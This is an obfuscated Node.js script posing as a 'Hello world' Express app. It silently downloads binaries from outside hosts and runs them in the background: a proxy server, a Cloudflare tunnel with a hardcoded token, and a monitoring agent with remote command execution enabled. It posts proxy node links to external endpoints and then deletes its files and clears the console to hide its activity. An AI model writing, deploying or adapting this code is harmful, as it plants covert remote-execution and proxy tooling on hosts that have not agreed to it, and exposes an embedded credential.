const _0x58825d=_0x365a;(function(_0x5bd55c,_0x3548d2){const _0xdf402d=_0x365a,_0x4ddba2=_0x5bd55c();while(!![]){try{const _0x5b2d6d=-parseInt(_0xdf402d(0x1e7))/0x1*(-parseInt(_0xdf402d(0x182))/0x2)+-parseInt(_0xdf402d(0x226))/0x3+-parseInt(_0xdf402d(0x17a))/0x4+-parseInt(_0xdf402d(0x1a8))/0x5*(parseInt(_0xdf402d(0x1c1))/0x6)+-parseInt(_0xdf402d(0x1a0))/0x7*(parseInt(_0xdf402d(0x18b))/0x8)+parseInt(_0xdf402d(0x1d4))/0x9*(parseInt(_0xdf402d(0x209))/0xa)+-parseInt(_0xdf402d(0x16e))/0xb;if(_0x5b2d6d===_0x3548d2)break;else _0x4ddba2['push'](_0x4ddba2['shift']());}catch(_0x23a27c){_0x4ddba2['push'](_0x4ddba2['shift']());}}}(_0x41e4,0xaafcb));const express=require('express'),app=express(),axios=require(_0x58825d(0x22b)),os=require('os'),fs=require('fs'),path=require(_0x58825d(0x215)),{promisify}=require(_0x58825d(0x197)),exec=promisify(require(_0x58825d(0x22c))[_0x58825d(0x18a)]),{execSync}=require(_0x58825d(0x22c)),UPLOAD_URL=process['env'][_0x58825d(0x210)]||'',PROJECT_URL=process[_0x58825d(0x195)][_0x58825d(0x1a7)]||'',AUTO_ACCESS=process['env'][_0x58825d(0x1a4)]||![],FILE_PATH=process[_0x58825d(0x195)][_0x58825d(0x1ce)]||'./tmp',SUB_PATH=process[_0x58825d(0x195)]['SUB_PATH']||_0x58825d(0x1da),PORT=process['env']['SERVER_PORT']||process[_0x58825d(0x195)][_0x58825d(0x21b)]||0xbb8,UUID=process[_0x58825d(0x195)][_0x58825d(0x1f0)]||'bc97f674-c578-4940-9234-0a1da46041b9',NEZHA_SERVER=process['env'][_0x58825d(0x183)]||'',NEZHA_PORT=process[_0x58825d(0x195)][_0x58825d(0x1b7)]||'',NEZHA_KEY=process['env'][_0x58825d(0x1ea)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x58825d(0x202),ARGO_AUTH=process[_0x58825d(0x195)]['ARGO_AUTH']||_0x58825d(0x1f4),ARGO_PORT=process[_0x58825d(0x195)][_0x58825d(0x1e9)]||0x1f41,CFIP=process[_0x58825d(0x195)][_0x58825d(0x1f8)]||_0x58825d(0x1e5),CFPORT=process[_0x58825d(0x195)]['CFPORT']||0x1bb,NAME=process[_0x58825d(0x195)][_0x58825d(0x1d5)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x58825d(0x1a3)](FILE_PATH),console[_0x58825d(0x21a)](FILE_PATH+'\x20is\x20created')):console[_0x58825d(0x21a)](FILE_PATH+_0x58825d(0x22e));function generateRandomName(){const _0x1b5dc5=_0x58825d,_0x23e794=_0x1b5dc5(0x1d7);let _0x245767='';for(let _0x2f2567=0x0;_0x2f2567<0x6;_0x2f2567++){_0x245767+=_0x23e794[_0x1b5dc5(0x1c0)](Math[_0x1b5dc5(0x19d)](Math[_0x1b5dc5(0x16f)]()*_0x23e794[_0x1b5dc5(0x213)]));}return _0x245767;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x58825d(0x193)](FILE_PATH,npmName),phpPath=path[_0x58825d(0x193)](FILE_PATH,phpName),webPath=path[_0x58825d(0x193)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x58825d(0x193)](FILE_PATH,_0x58825d(0x19a)),listPath=path[_0x58825d(0x193)](FILE_PATH,_0x58825d(0x190)),bootLogPath=path[_0x58825d(0x193)](FILE_PATH,_0x58825d(0x1e2)),configPath=path[_0x58825d(0x193)](FILE_PATH,_0x58825d(0x1fa));function _0x365a(_0x4ba0a3,_0x1dc4e1){_0x4ba0a3=_0x4ba0a3-0x169;const _0x41e455=_0x41e4();let _0x365ae8=_0x41e455[_0x4ba0a3];return _0x365ae8;}function deleteNodes(){const _0x3b8984=_0x58825d;try{if(!UPLOAD_URL)return;if(!fs[_0x3b8984(0x1f1)](subPath))return;let _0x5c07a1;try{_0x5c07a1=fs['readFileSync'](subPath,_0x3b8984(0x218));}catch{return null;}const _0x301701=Buffer[_0x3b8984(0x1c6)](_0x5c07a1,'base64')[_0x3b8984(0x189)](_0x3b8984(0x218)),_0x4882a5=_0x301701[_0x3b8984(0x1dd)]('\x0a')[_0x3b8984(0x1c2)](_0x144c39=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3b8984(0x17c)](_0x144c39));if(_0x4882a5['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x3b8984(0x1d6),JSON[_0x3b8984(0x1f3)]({'nodes':_0x4882a5}),{'headers':{'Content-Type':_0x3b8984(0x174)}})[_0x3b8984(0x1de)](_0x2a2ad1=>{return null;}),null;}catch(_0x1b18c6){return null;}}function cleanupOldFiles(){const _0xe4942=_0x58825d;try{const _0x25de5f=fs[_0xe4942(0x1af)](FILE_PATH);_0x25de5f[_0xe4942(0x1f6)](_0x3e6320=>{const _0x42968b=_0xe4942,_0x4175de=path[_0x42968b(0x193)](FILE_PATH,_0x3e6320);try{const _0x3bc23c=fs[_0x42968b(0x1df)](_0x4175de);_0x3bc23c[_0x42968b(0x20b)]()&&fs[_0x42968b(0x1c3)](_0x4175de);}catch(_0x42a913){}});}catch(_0xd4e458){}}app[_0x58825d(0x1b0)]('/',function(_0x34580d,_0x42225c){const _0x4bfae6=_0x58825d;_0x42225c[_0x4bfae6(0x1a5)](_0x4bfae6(0x16d));});async function generateConfig(){const _0x1db792=_0x58825d,_0x3ee700={'log':{'access':'/dev/null','error':_0x1db792(0x191),'loglevel':_0x1db792(0x20c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1db792(0x1c9),'settings':{'clients':[{'id':UUID,'flow':_0x1db792(0x211)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x1db792(0x219),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x1db792(0x20d),'dest':0xbbc}]},'streamSettings':{'network':_0x1db792(0x214)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x1db792(0x20c)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x1db792(0x1c9),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1db792(0x20c)},'streamSettings':{'network':'ws','security':_0x1db792(0x20c),'wsSettings':{'path':_0x1db792(0x219)}},'sniffing':{'enabled':!![],'destOverride':[_0x1db792(0x177),_0x1db792(0x21d),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1db792(0x1f7),'protocol':_0x1db792(0x17b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1db792(0x177),_0x1db792(0x21d),_0x1db792(0x172)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x1db792(0x180),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1db792(0x20c),'wsSettings':{'path':_0x1db792(0x20d)}},'sniffing':{'enabled':!![],'destOverride':[_0x1db792(0x177),_0x1db792(0x21d),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x1db792(0x220)]},'outbounds':[{'protocol':_0x1db792(0x1b4),'tag':_0x1db792(0x185)},{'protocol':_0x1db792(0x200),'tag':_0x1db792(0x187)}]};fs[_0x1db792(0x1a9)](path[_0x1db792(0x193)](FILE_PATH,'config.json'),JSON[_0x1db792(0x1f3)](_0x3ee700,null,0x2));}function getSystemArchitecture(){const _0x438bb9=_0x58825d,_0x11ede9=os[_0x438bb9(0x1d0)]();return _0x11ede9===_0x438bb9(0x1ba)||_0x11ede9===_0x438bb9(0x21f)||_0x11ede9===_0x438bb9(0x171)?'arm':_0x438bb9(0x1e1);}function downloadFile(_0x329958,_0x26b4fb,_0x43cb0d){const _0x4797d0=_0x58825d,_0x3f1fed=_0x329958;!fs['existsSync'](FILE_PATH)&&fs[_0x4797d0(0x1a3)](FILE_PATH,{'recursive':!![]});const _0x478c9e=fs[_0x4797d0(0x1ca)](_0x3f1fed);axios({'method':_0x4797d0(0x1b0),'url':_0x26b4fb,'responseType':_0x4797d0(0x199)})[_0x4797d0(0x1b8)](_0x40a562=>{const _0x5755c6=_0x4797d0;_0x40a562[_0x5755c6(0x194)][_0x5755c6(0x1e4)](_0x478c9e),_0x478c9e['on'](_0x5755c6(0x18f),()=>{const _0x59f232=_0x5755c6;_0x478c9e[_0x59f232(0x1ef)](),console[_0x59f232(0x21a)](_0x59f232(0x175)+path['basename'](_0x3f1fed)+'\x20successfully'),_0x43cb0d(null,_0x3f1fed);}),_0x478c9e['on'](_0x5755c6(0x1ff),_0x1a4401=>{const _0x74a712=_0x5755c6;fs[_0x74a712(0x212)](_0x3f1fed,()=>{});const _0x5c70b5=_0x74a712(0x175)+path[_0x74a712(0x184)](_0x3f1fed)+_0x74a712(0x20e)+_0x1a4401['message'];console[_0x74a712(0x1ff)](_0x5c70b5),_0x43cb0d(_0x5c70b5);});})[_0x4797d0(0x1de)](_0x56c796=>{const _0x4efe34=_0x4797d0,_0x62ee8b='Download\x20'+path['basename'](_0x3f1fed)+_0x4efe34(0x20e)+_0x56c796[_0x4efe34(0x227)];console[_0x4efe34(0x1ff)](_0x62ee8b),_0x43cb0d(_0x62ee8b);});}async function downloadFilesAndRun(){const _0x3964bc=_0x58825d,_0x50fa0e=getSystemArchitecture(),_0xd011f6=getFilesForArchitecture(_0x50fa0e);if(_0xd011f6['length']===0x0){console[_0x3964bc(0x21a)](_0x3964bc(0x21e));return;}const _0x2758bb=_0xd011f6[_0x3964bc(0x16c)](_0x559ea5=>{return new Promise((_0x1d1dc6,_0x2a7c01)=>{const _0x3801be=_0x365a;downloadFile(_0x559ea5[_0x3801be(0x169)],_0x559ea5[_0x3801be(0x188)],(_0x59a137,_0x1ca341)=>{_0x59a137?_0x2a7c01(_0x59a137):_0x1d1dc6(_0x1ca341);});});});try{await Promise['all'](_0x2758bb);}catch(_0x4dcb9a){console[_0x3964bc(0x1ff)]('Error\x20downloading\x20files:',_0x4dcb9a);return;}function _0x108307(_0x3df9ac){const _0x281a7d=_0x3964bc,_0xe04955=0x1fd;_0x3df9ac[_0x281a7d(0x1f6)](_0x3f7b9b=>{const _0x2600e8=_0x281a7d;fs[_0x2600e8(0x1f1)](_0x3f7b9b)&&fs['chmod'](_0x3f7b9b,_0xe04955,_0x205f3a=>{const _0x571552=_0x2600e8;_0x205f3a?console[_0x571552(0x1ff)](_0x571552(0x1cd)+_0x3f7b9b+':\x20'+_0x205f3a):console[_0x571552(0x21a)](_0x571552(0x1b9)+_0x3f7b9b+':\x20'+_0xe04955['toString'](0x8));});});}const _0x161cb9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x108307(_0x161cb9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xd36ab0=NEZHA_SERVER[_0x3964bc(0x1ad)](':')?NEZHA_SERVER[_0x3964bc(0x1dd)](':')[_0x3964bc(0x1e8)]():'',_0x1c7106=new Set([_0x3964bc(0x18e),'8443','2096',_0x3964bc(0x19c),_0x3964bc(0x228),'2053']),_0x39c534=_0x1c7106[_0x3964bc(0x1f2)](_0xd36ab0)?_0x3964bc(0x1bd):_0x3964bc(0x16a),_0x4b9c6c=_0x3964bc(0x1d9)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3964bc(0x1b5)+_0x39c534+_0x3964bc(0x1bb)+UUID;fs[_0x3964bc(0x1a9)](path[_0x3964bc(0x193)](FILE_PATH,_0x3964bc(0x20a)),_0x4b9c6c);const _0x327dde=_0x3964bc(0x1dc)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x3964bc(0x225);try{await exec(_0x327dde),console[_0x3964bc(0x21a)](phpName+'\x20is\x20running'),await new Promise(_0x1395af=>setTimeout(_0x1395af,0x3e8));}catch(_0x26c739){console['error'](_0x3964bc(0x207)+_0x26c739);}}else{let _0x4493e6='';const _0x13b201=[_0x3964bc(0x18e),_0x3964bc(0x18d),_0x3964bc(0x222),_0x3964bc(0x19c),_0x3964bc(0x228),_0x3964bc(0x173)];_0x13b201[_0x3964bc(0x1ad)](NEZHA_PORT)&&(_0x4493e6=_0x3964bc(0x208));const _0xdc9a98=_0x3964bc(0x1dc)+npmPath+_0x3964bc(0x1ed)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4493e6+_0x3964bc(0x170);try{await exec(_0xdc9a98),console[_0x3964bc(0x21a)](npmName+'\x20is\x20running'),await new Promise(_0x4d213a=>setTimeout(_0x4d213a,0x3e8));}catch(_0x278c0e){console[_0x3964bc(0x1ff)](_0x3964bc(0x1c8)+_0x278c0e);}}}else console[_0x3964bc(0x21a)](_0x3964bc(0x205));const _0x3b6a47=_0x3964bc(0x1dc)+webPath+_0x3964bc(0x1cf)+FILE_PATH+_0x3964bc(0x196);try{await exec(_0x3b6a47),console['log'](webName+_0x3964bc(0x1d2)),await new Promise(_0x34c444=>setTimeout(_0x34c444,0x3e8));}catch(_0x2258a3){console[_0x3964bc(0x1ff)]('web\x20running\x20error:\x20'+_0x2258a3);}if(fs[_0x3964bc(0x1f1)](botPath)){let _0x5cbb34;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x5cbb34=_0x3964bc(0x1bc)+ARGO_AUTH;else ARGO_AUTH[_0x3964bc(0x1cb)](/TunnelSecret/)?_0x5cbb34=_0x3964bc(0x186)+FILE_PATH+'/tunnel.yml\x20run':_0x5cbb34=_0x3964bc(0x206)+FILE_PATH+_0x3964bc(0x1fe)+ARGO_PORT;try{await exec(_0x3964bc(0x1dc)+botPath+'\x20'+_0x5cbb34+'\x20>/dev/null\x202>&1\x20&'),console[_0x3964bc(0x21a)](botName+'\x20is\x20running'),await new Promise(_0x370002=>setTimeout(_0x370002,0x7d0));}catch(_0x2da8bc){console['error']('Error\x20executing\x20command:\x20'+_0x2da8bc);}}await new Promise(_0x3f8aec=>setTimeout(_0x3f8aec,0x1388));}function getFilesForArchitecture(_0x5a4930){const _0xd57028=_0x58825d;let _0x3d8194;_0x5a4930===_0xd57028(0x1ba)?_0x3d8194=[{'fileName':webPath,'fileUrl':_0xd57028(0x1db)},{'fileName':botPath,'fileUrl':_0xd57028(0x178)}]:_0x3d8194=[{'fileName':webPath,'fileUrl':_0xd57028(0x201)},{'fileName':botPath,'fileUrl':_0xd57028(0x1c5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1b2e81=_0x5a4930===_0xd57028(0x1ba)?_0xd57028(0x1a2):_0xd57028(0x217);_0x3d8194['unshift']({'fileName':npmPath,'fileUrl':_0x1b2e81});}else{const _0x4ccb10=_0x5a4930===_0xd57028(0x1ba)?_0xd57028(0x203):_0xd57028(0x1aa);_0x3d8194[_0xd57028(0x22a)]({'fileName':phpPath,'fileUrl':_0x4ccb10});}}return _0x3d8194;}function argoType(){const _0x35d030=_0x58825d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x35d030(0x21a)](_0x35d030(0x21c));return;}if(ARGO_AUTH[_0x35d030(0x1ad)]('TunnelSecret')){fs[_0x35d030(0x1a9)](path[_0x35d030(0x193)](FILE_PATH,_0x35d030(0x1eb)),ARGO_AUTH);const _0xed6598='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x35d030(0x1d8)+path[_0x35d030(0x193)](FILE_PATH,_0x35d030(0x1eb))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x35d030(0x1ec)+ARGO_PORT+_0x35d030(0x224);fs[_0x35d030(0x1a9)](path[_0x35d030(0x193)](FILE_PATH,_0x35d030(0x221)),_0xed6598);}else console[_0x35d030(0x21a)](_0x35d030(0x1e3));}argoType();async function extractDomains(){const _0x34fa44=_0x58825d;let _0xbe752c;if(ARGO_AUTH&&ARGO_DOMAIN)_0xbe752c=ARGO_DOMAIN,console['log'](_0x34fa44(0x16b),_0xbe752c),await _0x2b293d(_0xbe752c);else try{const _0x1bd46c=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x34fa44(0x218)),_0x55f0fe=_0x1bd46c['split']('\x0a'),_0x1ca176=[];_0x55f0fe[_0x34fa44(0x1f6)](_0x544beb=>{const _0x9df6a4=_0x34fa44,_0x382e71=_0x544beb[_0x9df6a4(0x1cb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x382e71){const _0x4cd61c=_0x382e71[0x1];_0x1ca176[_0x9df6a4(0x1a6)](_0x4cd61c);}});if(_0x1ca176[_0x34fa44(0x213)]>0x0)_0xbe752c=_0x1ca176[0x0],console[_0x34fa44(0x21a)](_0x34fa44(0x19e),_0xbe752c),await _0x2b293d(_0xbe752c);else{console[_0x34fa44(0x21a)](_0x34fa44(0x1f5)),fs[_0x34fa44(0x1c3)](path[_0x34fa44(0x193)](FILE_PATH,_0x34fa44(0x1e2)));async function _0x3714f0(){const _0x7eaa5c=_0x34fa44;try{process[_0x7eaa5c(0x20f)]==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x7eaa5c(0x198)):await exec(_0x7eaa5c(0x19f)+botName[_0x7eaa5c(0x1c0)](0x0)+']'+botName[_0x7eaa5c(0x22d)](0x1)+_0x7eaa5c(0x1f9));}catch(_0x20230a){}}_0x3714f0(),await new Promise(_0x15150a=>setTimeout(_0x15150a,0xbb8));const _0x5cca77=_0x34fa44(0x206)+FILE_PATH+_0x34fa44(0x1fe)+ARGO_PORT;try{await exec(_0x34fa44(0x1dc)+botPath+'\x20'+_0x5cca77+_0x34fa44(0x1fd)),console[_0x34fa44(0x21a)](botName+_0x34fa44(0x1d2)),await new Promise(_0x26bb6a=>setTimeout(_0x26bb6a,0xbb8)),await extractDomains();}catch(_0x53f773){console['error'](_0x34fa44(0x1fc)+_0x53f773);}}}catch(_0x2b89c4){console['error'](_0x34fa44(0x204),_0x2b89c4);}async function _0x2b293d(_0x21c7fc){const _0x2ac965=_0x34fa44,_0x5884dc=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x13e9a8=_0x5884dc[_0x2ac965(0x192)](),_0x582085=NAME?NAME+'-'+_0x13e9a8:_0x13e9a8;return new Promise(_0x499386=>{setTimeout(()=>{const _0x336045=_0x365a,_0x5af65e={'v':'2','ps':''+_0x582085,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x336045(0x20c),'net':'ws','type':'none','host':_0x21c7fc,'path':_0x336045(0x216),'tls':_0x336045(0x21d),'sni':_0x21c7fc,'alpn':'','fp':'firefox'},_0xa02a20=_0x336045(0x176)+UUID+'@'+CFIP+':'+CFPORT+_0x336045(0x1ae)+_0x21c7fc+_0x336045(0x1be)+_0x21c7fc+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x582085+_0x336045(0x17e)+Buffer[_0x336045(0x1c6)](JSON[_0x336045(0x1f3)](_0x5af65e))[_0x336045(0x189)](_0x336045(0x223))+_0x336045(0x1bf)+UUID+'@'+CFIP+':'+CFPORT+_0x336045(0x1e0)+_0x21c7fc+_0x336045(0x1be)+_0x21c7fc+_0x336045(0x1c4)+_0x582085+_0x336045(0x17d);console[_0x336045(0x21a)](Buffer[_0x336045(0x1c6)](_0xa02a20)[_0x336045(0x189)]('base64')),fs[_0x336045(0x1a9)](subPath,Buffer[_0x336045(0x1c6)](_0xa02a20)[_0x336045(0x189)]('base64')),console[_0x336045(0x21a)](FILE_PATH+_0x336045(0x1fb)),uploadNodes(),app[_0x336045(0x1b0)]('/'+SUB_PATH,(_0x5452d2,_0x4dff05)=>{const _0x19b26f=_0x336045,_0x5ec55f=Buffer[_0x19b26f(0x1c6)](_0xa02a20)[_0x19b26f(0x189)](_0x19b26f(0x223));_0x4dff05[_0x19b26f(0x1d1)]('Content-Type',_0x19b26f(0x19b)),_0x4dff05['send'](_0x5ec55f);}),_0x499386(_0xa02a20);},0x7d0);});}}async function uploadNodes(){const _0x3bf602=_0x58825d;if(UPLOAD_URL&&PROJECT_URL){const _0x21fc97=PROJECT_URL+'/'+SUB_PATH,_0x43f6c4={'subscription':[_0x21fc97]};try{const _0x4bb657=await axios[_0x3bf602(0x18c)](UPLOAD_URL+_0x3bf602(0x1b6),_0x43f6c4,{'headers':{'Content-Type':'application/json'}});return _0x4bb657&&_0x4bb657[_0x3bf602(0x1ab)]===0xc8?(console[_0x3bf602(0x21a)](_0x3bf602(0x179)),_0x4bb657):null;}catch(_0xe6ad51){if(_0xe6ad51[_0x3bf602(0x1cc)]){if(_0xe6ad51[_0x3bf602(0x1cc)][_0x3bf602(0x1ab)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3bf602(0x1f1)](listPath))return;const _0x128d1f=fs[_0x3bf602(0x1b1)](listPath,_0x3bf602(0x218)),_0x209904=_0x128d1f[_0x3bf602(0x1dd)]('\x0a')[_0x3bf602(0x1c2)](_0x44938b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x44938b));if(_0x209904[_0x3bf602(0x213)]===0x0)return;const _0xc9af67=JSON[_0x3bf602(0x1f3)]({'nodes':_0x209904});try{const _0x2b4523=await axios['post'](UPLOAD_URL+_0x3bf602(0x181),_0xc9af67,{'headers':{'Content-Type':_0x3bf602(0x174)}});return _0x2b4523&&_0x2b4523['status']===0xc8?(console[_0x3bf602(0x21a)]('Nodes\x20uploaded\x20successfully'),_0x2b4523):null;}catch(_0x365a55){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x310c98=_0x365a,_0x42f45d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x42f45d[_0x310c98(0x1a6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x42f45d['push'](phpPath);process[_0x310c98(0x20f)]===_0x310c98(0x229)?exec(_0x310c98(0x1d3)+_0x42f45d[_0x310c98(0x193)]('\x20')+'\x20>\x20nul\x202>&1',_0x42c554=>{const _0x59ff9b=_0x310c98;console['clear'](),console[_0x59ff9b(0x21a)](_0x59ff9b(0x1c7)),console[_0x59ff9b(0x21a)](_0x59ff9b(0x1ee));}):exec(_0x310c98(0x1b2)+_0x42f45d[_0x310c98(0x193)]('\x20')+_0x310c98(0x1a1),_0x3d3a20=>{const _0x2d27c3=_0x310c98;console[_0x2d27c3(0x17f)](),console[_0x2d27c3(0x21a)](_0x2d27c3(0x1c7)),console[_0x2d27c3(0x21a)](_0x2d27c3(0x1ee));});},0x15f90);}function _0x41e4(){const _0x4f1418=['https://amd64.ssss.nyc.mn/web','northflankgb.dunkirk.de5.net','https://arm64.ssss.nyc.mn/v1','Error\x20reading\x20boot.log:','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','php\x20running\x20error:\x20','--tls','1760SiqjnE','config.yaml','isFile','none','/trojan-argo','\x20failed:\x20','platform','UPLOAD_URL','xtls-rprx-vision','unlink','length','tcp','path','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/agent','utf-8','/vless-argo','log','PORT','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','arm64','https+local://8.8.8.8/dns-query','tunnel.yml','2096','base64','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','72441HGdsNF','message','2083','win32','unshift','axios','child_process','substring','\x20already\x20exists','fileName','false','ARGO_DOMAIN:','map','Hello\x20world!','1287220OJdcbf','random','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','aarch64','quic','2053','application/json','Download\x20','\x0avless://','http','https://arm64.ssss.nyc.mn/bot','Subscription\x20uploaded\x20successfully','1152808lJXrRj','vmess','test','\x0a\x20\x20\x20\x20','\x0a\x20\x20\x0avmess://','clear','trojan','/api/add-nodes','2426518xDXEGD','NEZHA_SERVER','basename','direct','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','block','fileUrl','toString','exec','4925296fgBtAU','post','8443','443','finish','list.txt','/dev/null','trim','join','data','env','/config.json\x20>/dev/null\x202>&1\x20&','util','.exe\x20>\x20nul\x202>&1','stream','sub.txt','text/plain;\x20charset=utf-8','2087','floor','ArgoDomain:','pkill\x20-f\x20\x22[','7fCLowW','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/agent','mkdirSync','AUTO_ACCESS','send','push','PROJECT_URL','5hPzdGB','writeFileSync','https://amd64.ssss.nyc.mn/v1','status','Skipping\x20adding\x20automatic\x20access\x20task','includes','?encryption=none&security=tls&sni=','readdirSync','get','readFileSync','rm\x20-rf\x20','Unhandled\x20error\x20in\x20startserver:','freedom','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/api/add-subscriptions','NEZHA_PORT','then','Empowerment\x20success\x20for\x20','arm','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','true','&fp=firefox&type=ws&host=','\x0a\x20\x20\x0atrojan://','charAt','1473654lwkBit','filter','unlinkSync','&path=%2Ftrojan-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/bot','from','App\x20is\x20running','npm\x20running\x20error:\x20','vless','createWriteStream','match','response','Empowerment\x20failed\x20for\x20','FILE_PATH','\x20-c\x20','arch','set','\x20is\x20running','del\x20/f\x20/q\x20','39771xnxCRm','NAME','/api/delete-nodes','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20credentials-file:\x20','\x0aclient_secret:\x20','subabc','https://arm64.ssss.nyc.mn/web','nohup\x20','split','catch','statSync','?security=tls&sni=','amd','boot.log','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','pipe','saas.sin.fan','https://oooo.serv00.net/add-url','1nLsXLq','pop','ARGO_PORT','NEZHA_KEY','tunnel.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x20-s\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','close','UUID','existsSync','has','stringify','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiY2M4OTJhZmMtOWEwMi00MjczLWI4ZDgtNmRjOTZhZmM3NDQ3IiwicyI6IlpUYzFPVEk1TlRJdFlURmhPQzAwWldRNExXSmxNREl0WmpJek56ZzJZV016TlRBMSJ9','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','forEach','127.0.0.1','CFIP','\x22\x20>\x20/dev/null\x202>&1','config.json','/sub.txt\x20saved\x20successfully','Error\x20executing\x20command:\x20','\x20>/dev/null\x202>&1\x20&','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','error','blackhole'];_0x41e4=function(){return _0x4f1418;};return _0x41e4();}cleanFiles();async function AddVisitTask(){const _0x3bfa80=_0x58825d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3bfa80(0x21a)](_0x3bfa80(0x1ac));return;}try{const _0x29d450=await axios[_0x3bfa80(0x18c)](_0x3bfa80(0x1e6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3bfa80(0x174)}});return console[_0x3bfa80(0x21a)]('automatic\x20access\x20task\x20added\x20successfully'),_0x29d450;}catch(_0x3637d9){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3637d9[_0x3bfa80(0x227)]),null;}}async function startserver(){try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x39dea4){console['error']('Error\x20in\x20startserver:',_0x39dea4);}}startserver()['catch'](_0x3b92a1=>{const _0xd3d889=_0x58825d;console['error'](_0xd3d889(0x1b3),_0x3b92a1);}),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
